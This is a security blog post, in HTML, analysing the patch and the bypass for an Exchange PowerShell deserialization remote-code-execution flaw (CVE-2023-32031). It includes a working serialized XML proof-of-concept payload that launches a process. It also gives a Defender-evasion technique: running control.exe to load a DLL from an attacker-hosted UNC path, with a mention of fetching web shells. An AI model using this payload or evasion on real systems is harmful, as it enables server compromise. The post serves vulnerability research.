<!DOCTYPE html>
































<html
  class="not-ready text-sm lg:text-base"
  style="--bg: #faf6f1"
  lang="en-us"
>
  <head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1, shrink-to-fit=no"
  />

  
  <title>CVE-2023-32031 MS Exchange PowerShell backend RCE - Out Of Band Writes</title>

  
  <meta name="theme-color" />

  
  
  
  <meta name="description" content="After reading Starlabs’s blog about an interesting variant of CVE-2022-41082 and seeing a tweet by chudyPB about a new bypass that he found. I get carious to analyzing his bypasses (known as CVE-2023-32031 and CVE-2023-21529)
To understand this very creative bypass please read ZDI’s blog about CVE-2022-41082 first.
Patch diff The most important patch is on ChainedSerializationBinder class:
The blacklist is improved with new types (Microsoft.Diagnostics.Runtime.Utilities.Command is the one which can be used for RCE, we will talk about it later) ValidateResultType is removed and IsTypeExplicitlyDenied method is changed." />
  <meta name="author" content="Out Of Band Writes" />
  

  
  
  
  
  
  
  <link rel="preload stylesheet" as="style" href="https://littlepwner.github.io/main.min.css" />

  
  <script
    defer
    src="https://littlepwner.github.io/highlight.min.js"
    onload="hljs.initHighlightingOnLoad();"
  ></script>
  

  
   
  <link rel="preload" as="image" href="https://littlepwner.github.io/theme.png" />

  
  
  
  

  
  <link rel="preload" as="image" href="https://littlepwner.github.io/twitter.svg" />
  
  <link rel="preload" as="image" href="https://littlepwner.github.io/rss.svg" />
  
  

  
  

  
  <link rel="icon" href="https://littlepwner.github.io/favicon.ico" />
  <link rel="apple-touch-icon" href="https://littlepwner.github.io/apple-touch-icon.png" />

  
  <meta name="generator" content="Hugo 0.115.0">

  
  

  
  
  
  
  
  
  
  <meta property="og:title" content="CVE-2023-32031 MS Exchange PowerShell backend RCE" />
<meta property="og:description" content="After reading Starlabs’s blog about an interesting variant of CVE-2022-41082 and seeing a tweet by chudyPB about a new bypass that he found. I get carious to analyzing his bypasses (known as CVE-2023-32031 and CVE-2023-21529)
To understand this very creative bypass please read ZDI’s blog about CVE-2022-41082 first.
Patch diff The most important patch is on ChainedSerializationBinder class:
The blacklist is improved with new types (Microsoft.Diagnostics.Runtime.Utilities.Command is the one which can be used for RCE, we will talk about it later) ValidateResultType is removed and IsTypeExplicitlyDenied method is changed." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://littlepwner.github.io/posts/cve-2023-32031-ms-exchange-powershell-backend-rce/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-01-07T07:36:27+01:00" />
<meta property="article:modified_time" content="2023-01-07T07:36:27+01:00" />

  
  <meta itemprop="name" content="CVE-2023-32031 MS Exchange PowerShell backend RCE">
<meta itemprop="description" content="After reading Starlabs’s blog about an interesting variant of CVE-2022-41082 and seeing a tweet by chudyPB about a new bypass that he found. I get carious to analyzing his bypasses (known as CVE-2023-32031 and CVE-2023-21529)
To understand this very creative bypass please read ZDI’s blog about CVE-2022-41082 first.
Patch diff The most important patch is on ChainedSerializationBinder class:
The blacklist is improved with new types (Microsoft.Diagnostics.Runtime.Utilities.Command is the one which can be used for RCE, we will talk about it later) ValidateResultType is removed and IsTypeExplicitlyDenied method is changed."><meta itemprop="datePublished" content="2023-01-07T07:36:27+01:00" />
<meta itemprop="dateModified" content="2023-01-07T07:36:27+01:00" />
<meta itemprop="wordCount" content="629">
<meta itemprop="keywords" content="dotnet,exchange,CVE-2023-32031,deserialization," />
  
  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2023-32031 MS Exchange PowerShell backend RCE"/>
<meta name="twitter:description" content="After reading Starlabs’s blog about an interesting variant of CVE-2022-41082 and seeing a tweet by chudyPB about a new bypass that he found. I get carious to analyzing his bypasses (known as CVE-2023-32031 and CVE-2023-21529)
To understand this very creative bypass please read ZDI’s blog about CVE-2022-41082 first.
Patch diff The most important patch is on ChainedSerializationBinder class:
The blacklist is improved with new types (Microsoft.Diagnostics.Runtime.Utilities.Command is the one which can be used for RCE, we will talk about it later) ValidateResultType is removed and IsTypeExplicitlyDenied method is changed."/>

  
  
</head>

  <body class="text-black duration-200 ease-out dark:text-white">
    <header class="mx-auto flex h-[5rem] max-w-3xl px-8 lg:justify-center">
  <div class="relative z-50 mr-auto flex items-center">
    <a
      class="-translate-x-[1px] -translate-y-[1px] text-2xl font-semibold"
      href="https://littlepwner.github.io/"
      >Out Of Band Writes</a
    >
    <div
      class="btn-dark text-[0] ml-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]"
      role="button"
      aria-label="Dark"
    ></div>
  </div>

  <div
    class="btn-menu relative z-50 -mr-8 flex h-[5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
    role="button"
    aria-label="Menu"
  ></div>

  
  <script>
    
    const htmlClass = document.documentElement.classList;
    setTimeout(() => {
      htmlClass.remove('not-ready');
    }, 10);

    
    const btnMenu = document.querySelector('.btn-menu');
    btnMenu.addEventListener('click', () => {
      htmlClass.toggle('open');
    });

    
    const metaTheme = document.querySelector('meta[name="theme-color"]');
    const lightBg = '#faf6f1'.replace(/"/g, '');
    const setDark = (isDark) => {
      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
      htmlClass[isDark ? 'add' : 'remove']('dark');
      localStorage.setItem('dark', isDark);
    };

    
    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
    if (htmlClass.contains('dark')) {
      setDark(true);
    } else {
      const darkVal = localStorage.getItem('dark');
      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
    }

    
    darkScheme.addEventListener('change', (event) => {
      setDark(event.matches);
    });

    
    const btnDark = document.querySelector('.btn-dark');
    btnDark.addEventListener('click', () => {
      setDark(localStorage.getItem('dark') !== 'true');
    });
  </script>

  <div
    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"
  >
    
    

    
    <nav
      class="mt-12 flex justify-center space-x-10 dark:invert lg:ml-12 lg:mt-0 lg:items-center lg:space-x-6"
    >
      
      <a
        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./twitter.svg)"
        href="https://twitter.com/little_pwner"
        target="_blank"
        rel="me"
      >
        twitter
      </a>
      
      <a
        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./rss.svg)"
        href="https://littlepwner.github.io/index.xml"
        target="_blank"
        rel="alternate"
      >
        rss
      </a>
      
    </nav>
    
  </div>
</header>


    <main
      class="prose prose-neutral relative mx-auto min-h-[calc(100%-10rem)] max-w-3xl px-8 pb-24 pt-16 dark:prose-invert"
    >
      

<article>
  <header class="mb-20">
    <h1 class="!my-0 pb-2.5">CVE-2023-32031 MS Exchange PowerShell backend RCE</h1>

    
    <div class="text-sm opacity-60">
      
      <time>Jan 7, 2023</time>
      
      
      
      
    </div>
    
  </header>

  <section><p><img src="/images/post_pics/CVE-2023-32031/7r8cws.jpg" alt="Untitled"></p>
<p>After reading <a href="https://starlabs.sg/blog/2023/04-microsoft-exchange-powershell-remoting-deserialization-leading-to-rce-cve-2023-21707/">Starlabs’s blog</a> about an interesting variant of CVE-2022-41082 and seeing a tweet by <a href="https://twitter.com/chudyPB/status/1668668229517029376">chudyPB</a> about a new bypass that he found. I get carious to analyzing his bypasses (known as CVE-2023-32031 and CVE-2023-21529)</p>
<p>To understand this very creative bypass please read <a href="https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend">ZDI’s blog</a> about CVE-2022-41082 first.</p>
<h1 id="patch-diff">Patch diff</h1>
<p>The most important patch is on <code>ChainedSerializationBinder</code> class:</p>
<ol>
<li>The blacklist is improved with new types (<code>Microsoft.Diagnostics.Runtime.Utilities.Command</code> is the one which can be used for RCE, we will talk about it later)</li>
</ol>
<p><img src="/images/post_pics/CVE-2023-32031/Untitled.png" alt="Untitled"></p>
<ol>
<li><code>ValidateResultType</code> is removed and <code>IsTypeExplicitlyDenied</code> method is changed.</li>
</ol>
<p><img src="/images/post_pics/CVE-2023-32031/Untitled%201.png" alt="Untitled"></p>
<p>The behavior of <code>IsTypeExplicitlyDenied</code> methods is changed and a new class called <code>TypeVisitor</code> is added.</p>
<p>in the new version instated of checking type with <code>ValidateResultType</code>(which calls <code>IsTypeExplicitlyDenied</code>) method, It will be checked with <code>InternalVisitType</code> in <code>TypeVisitor</code> class</p>
<p><img src="/images/post_pics/CVE-2023-32031/Untitled%202.png" alt="Untitled"></p>
<p>this method will check the type recursively and calls <code>validationDelegate</code> (Which is <code>CheckDenyOnThisExplicitType</code> method) for that type and each time it well set the type to type.BaseType (this should kill variants like CVE-2023-21707),</p>
<p>Also, It will call <code>VisitenericType</code> if the type is a Generic type:</p>
<p><img src="/images/post_pics/CVE-2023-32031/Untitled%203.png" alt="Untitled"></p>
<p>this method will pass all argument types in <code>type.GetGenericArguments()</code> and also <code>type.GetGenericTypeDefinition()</code> to <code>InternalVisitType</code> to validate them.</p>
<p><strong>This is the most critical point in the patch, in old version the <code>type.GetGenericArguments()</code> and <code>type.GetGenericTypeDefinition()</code> will not be validated.</strong></p>
<p>Based on the patch we could use a generic type to bypass the validation, but how?</p>
<h1 id="abusing-multivaluedproperty">Abusing MultiValuedProperty</h1>
<p>the type <code>MultiValuedProperty</code> is a Generic type allowed in <code>SerializationTypeConverter</code>:</p>
<p><img src="/images/post_pics/CVE-2023-32031/Untitled%204.png" alt="Untitled"></p>
<p>This class has a method named <code>ConvertInput</code> which will call <code>ConvertValue</code> method with the type of the argument type of MultiValuedProperty and object item</p>
<p><img src="/images/post_pics/CVE-2023-32031/Untitled%208.png" alt="Untitled"></p>
<p>the <code>ConvertValue</code> method contains logic to find a right converter for the given type and <code>originalvalue</code>, this method is kinda the same as <code>FigureConversion</code> in <code>System.Management.Automation.LanguagePrimitives</code></p>
<p><img src="/images/post_pics/CVE-2023-32031/Untitled%209.png" alt="Untitled"></p>
<p><img src="/images/post_pics/CVE-2023-32031/Untitled%2010.png" alt="Untitled"></p>
<p>the only limitation is <code>ValidateResultType</code>, but as mentioned this method only checks the type against the imperfect blacklist so as long as our type is not in blacklist we are fine here.</p>
<p>The <code>ConvertInput</code> method will be called by <code>AddValue</code> method:</p>
<p><img src="/images/post_pics/CVE-2023-32031/Untitled%207.png" alt="Untitled"></p>
<p>Which will be called by <code>AddValues</code> method:</p>
<p><img src="/images/post_pics/CVE-2023-32031/Untitled%206.png" alt="Untitled"></p>
<p>This method will be called multiple places including <code>MultiValuedProperty</code> constructor.</p>
<p>with those primitives, we can call a constructor with a single argument.
let&rsquo;s see <code>Microsoft.Diagnostics.Runtime.Utilities.Command</code> constructor:</p>
<p><img src="/images/post_pics/CVE-2023-32031/1.png" alt="Untitled">
<img src="/images/post_pics/CVE-2023-32031/2.png" alt="Untitled">
<img src="/images/post_pics/CVE-2023-32031/3.png" alt="Untitled"></p>
<p>We have a type that was not blacklisted and has a single argument constructor which will call <code>System.Diagnostics.Process.Start</code>.</p>
<p>here is the idea:</p>
<ol>
<li>Get a <code>MultiValuedProperty&lt;Command&gt;</code> type via <code>SerializationTypeConverter</code></li>
<li>Call its constructor with our arbitrary command which will result in a call to <code>AddValues</code>, which we can call the <code>Command</code> constructor in <code>ConvertValue</code></li>
</ol>
<p><img src="/images/post_pics/CVE-2023-32031/Untitled%2012.png" alt="Untitled"></p>
<p><img src="/images/post_pics/CVE-2023-32031/Untitled%205.png" alt="Untitled"></p>
<p>PoC:</p>
<pre tabindex="0"><code>&lt;Obj RefId=&#34;13&#34;&gt;
			&lt;TN RefId=&#34;0&#34;&gt;
				&lt;T&gt;System.Management.Automation.PSCustomObject&lt;/T&gt;
				&lt;T&gt;System.Object&lt;/T&gt;
			&lt;/TN&gt;
			&lt;MS&gt;
				&lt;S N=&#34;N&#34;&gt;-Identity:&lt;/S&gt;
								&lt;!--Object type section--&gt;
				&lt;Obj N=&#34;V&#34; RefId=&#34;14&#34;&gt;
					&lt;TN RefId=&#34;2&#34;&gt;
					&lt;T&gt;System.ServiceProcess.ServiceController&lt;/T&gt;
						&lt;T&gt;System.Object&lt;/T&gt;
					&lt;/TN&gt;
					&lt;ToString&gt;System.ServiceProcess.ServiceController&lt;/ToString&gt;

					&lt;Props&gt;
						&lt;S N=&#34;Name&#34;&gt;Type&lt;/S&gt;
						&lt;Obj N=&#34;TargetTypeForDeserialization&#34;&gt;
							&lt;TN RefId=&#34;2&#34;&gt;
								&lt;T&gt;System.Exception&lt;/T&gt;
								&lt;T&gt;System.Object&lt;/T&gt;
							&lt;/TN&gt;
							&lt;MS&gt;
								&lt;BA N=&#34;SerializationData&#34;&gt;AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAADDAU1pY3Jvc29mdC5FeGNoYW5nZS5EYXRhLk11bHRpVmFsdWVkUHJvcGVydHlgMVtbTWljcm9zb2Z0LkRpYWdub3N0aWNzLlJ1bnRpbWUuVXRpbGl0aWVzLkNvbW1hbmQsIE1pY3Jvc29mdC5EaWFnbm9zdGljcy5SdW50aW1lLCBWZXJzaW9uPTAuOC4zMS4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWIwM2Y1ZjdmMTFkNTBhM2FdXQQAAAAGAwAAAFtNaWNyb3NvZnQuRXhjaGFuZ2UuRGF0YSwgVmVyc2lvbj0xNS4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1Cw==&lt;/BA&gt;
							&lt;/MS&gt;
						&lt;/Obj&gt;
					&lt;/Props&gt;

					&lt;S&gt;mspaint.exe&lt;/S&gt;

				&lt;/Obj&gt;
			&lt;/MS&gt;
		&lt;/Obj&gt;
</code></pre><p><img src="/images/post_pics/CVE-2023-32031/17.png" alt="Untitled"></p>
<p>Call Stack:</p>
<p><img src="/images/post_pics/CVE-2023-32031/Untitled%2013.png" alt="Untitled"></p>
<h1 id="payload-delivery"><strong>Payload delivery</strong></h1>
<p>well, I could not use the method mentained on starlab&rsquo;s blog to deliver the payload (We need to call the constructor with an argument) and I also prefer a Python version that could be used anywhere.</p>
<p>So I used <a href="https://github.com/testanull/ProxyNotShell-PoC/blob/main/poc_aug3.py">ProxyNotsShell Poc</a> and some code of <a href="https://github.com/jborean93/pypsrp">pypsrp library</a> to communicate with exchange PowerShell backend using kerberos auth.</p>
<h1 id="bypass-defender">Bypass Defender</h1>
<p>If you enable the windows Defender Real-time protection and run exploit you will face this:</p>
<p><img src="/images/post_pics/CVE-2023-32031/16.png" alt="Untitled"></p>
<p>After some tries I noticed that the rule would not trigger for all binary files and some of them would execute without trigger for example <code>control.exe</code>, this binary could be used to load a DLL, and It also supports the UNC path.</p>
<p><img src="/images/post_pics/CVE-2023-32031/Untitled%2014.png" alt="Untitled"></p>
<p>So the attacker only needs to host their DLL somewhere that which exchange can access (the extension also does not matter) and run control.exe <code>\\host\a.edb</code></p>
<p><img src="/images/post_pics/CVE-2023-32031/Untitled%2015.png" alt="Untitled"></p>
<p>There are a lot of other lol bins which don’t trigger Defender and could be used to do something useful (Download Web Shell, etc…) This was just an example :D</p>
</section>

  
  
  <footer class="mt-12 flex flex-wrap">
     
    <a
      class="mb-1.5 mr-1.5 rounded-lg bg-black/[3%] px-5 py-1.5 no-underline dark:bg-white/[8%]"
      href="https://littlepwner.github.io/tags/dotnet"
      >dotnet</a
    >
     
    <a
      class="mb-1.5 mr-1.5 rounded-lg bg-black/[3%] px-5 py-1.5 no-underline dark:bg-white/[8%]"
      href="https://littlepwner.github.io/tags/exchange"
      >exchange</a
    >
     
    <a
      class="mb-1.5 mr-1.5 rounded-lg bg-black/[3%] px-5 py-1.5 no-underline dark:bg-white/[8%]"
      href="https://littlepwner.github.io/tags/cve-2023-32031"
      >CVE-2023-32031</a
    >
     
    <a
      class="mb-1.5 mr-1.5 rounded-lg bg-black/[3%] px-5 py-1.5 no-underline dark:bg-white/[8%]"
      href="https://littlepwner.github.io/tags/deserialization"
      >deserialization</a
    >
    
  </footer>
  

  
  
  

  
  

  
  
</article>


    </main>

    <footer
  class="opaco mx-auto flex h-[5rem] max-w-3xl items-center px-8 text-[0.9em] opacity-60"
>
  <div class="mr-auto">
    &copy; 2023
    <a class="link" href="https://littlepwner.github.io/">Out Of Band Writes</a>
  </div>
  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
    >Powered by Hugo️️</a
  >️
  <a
    class="link"
    href="https://github.com/nanxiaobei/hugo-paper"
    rel="noopener"
    target="_blank"
    >Theme Paper</a
  >
</footer>

  </body>
</html>
